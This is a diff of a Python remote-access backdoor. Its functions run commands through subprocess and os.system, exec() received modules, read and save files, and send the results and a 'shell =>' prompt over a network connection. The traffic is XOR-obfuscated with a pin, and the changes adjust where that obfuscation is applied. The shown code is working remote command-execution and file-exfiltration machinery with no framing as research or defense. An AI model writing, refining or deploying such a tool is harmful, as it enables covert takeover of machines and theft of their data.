@@ -31,10 +31,9 @@ def xor(string, key):
         data += char
     return data
 
-
 def module_handler(module, modname):
-    status_msg(xor("[+] Module: %s\n" % modname, pin))
-    status_msg(xor("[+] Start time: %s" % logtime, pin))
+    status_msg("[+] Module: %s\n" % modname)
+    status_msg("[+] Start time: %s" % logtime)
     exec(module)
     connection.send(xor("shell => ", pin))
 
@@ -50,9 +49,9 @@ def log_msg(message):
 def cat_file(filename):
     if os.path.exists(filename) and os.access(filename, os.R_OK):
         catfile = open(filename, "rb")
-        connection.send("[+] Contents of %s" % filename)
+        connection.send(xor("[+] Contents of %s" % filename, pin))
         for lines in catfile.readlines():
-            connection.sendall(xor(lines, pin))
+            connection.sendall(xor( lines ,pin))
         catfile.close()
 
 
@@ -64,7 +63,6 @@ def save_file(filename):
         connection.send(xor(":savef %s" % filename, pin))
         time.sleep(2)
         connection.sendall(xor( filedata , pin))
-        time.sleep(2)
     else:
         pass
 
@@ -78,7 +76,6 @@ def cmd(command):
                )
     stdout, stderr = proc.communicate()
     connection.sendall(xor( stdout , pin))              # Send output back to the client
-
 
 def cmd2txt(command, textfile):
     os.system("%s > %s" % (command, textfile))
